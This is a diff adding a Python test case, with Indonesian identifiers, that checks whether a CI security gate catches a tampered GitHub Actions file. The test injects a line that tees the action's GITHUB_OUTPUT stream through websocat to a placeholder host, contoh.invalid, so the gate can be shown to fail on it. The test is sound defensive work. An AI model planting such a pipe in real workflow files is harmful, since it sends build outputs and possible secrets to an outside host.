@@ -21975,6 +21975,27 @@ def main():
                         [sys.executable, GERBANG, "--semua"])
         periksa("terraform console membaca perintah dari stdin: gerbang gagal (Audit 1900)", rc != 0)
         shutil.rmtree(sub1029, ignore_errors=True)
+        sub1030 = klon(tmp, "sub1030")
+        berkas_aksi1030 = os.path.join(
+            sub1030, ".github", "actions", "resolve-vw",
+            "action.yml")
+        with open(berkas_aksi1030, encoding="utf-8") as f:
+            isi_aksi1030 = f.read()
+        baris_aksi1030 = [b for b in isi_aksi1030.splitlines()
+                          if "tag_mentah" in b and "GITHUB_OUTPUT" in b][0]
+        isi_baru1030 = isi_aksi1030.replace(
+                baris_aksi1030,
+                baris_aksi1030.replace(
+                    '>> "$GITHUB_OUTPUT"',
+                    "> >(websocat ws://contoh.invalid; cat >> \"$GITHUB_OUTPUT\")"), 1)
+        assert isi_baru1030 != isi_aksi1030, \
+            "suntikan aksi1030 tidak menembak"
+        with open(berkas_aksi1030, "w", encoding="utf-8") as f:
+            f.write(isi_baru1030)
+        rc, out = jalan(sub1030,
+                        [sys.executable, GERBANG, "--semua"])
+        periksa("websocat klien sederhana meneruskan stdin: gerbang gagal (Audit 1901)", rc != 0)
+        shutil.rmtree(sub1030, ignore_errors=True)
         umpanbak = klon(tmp, "umpanbak")
         berkas_ub = os.path.join(umpanbak, ".github", "actions",
                                  "resolve-vw", "action.yml")
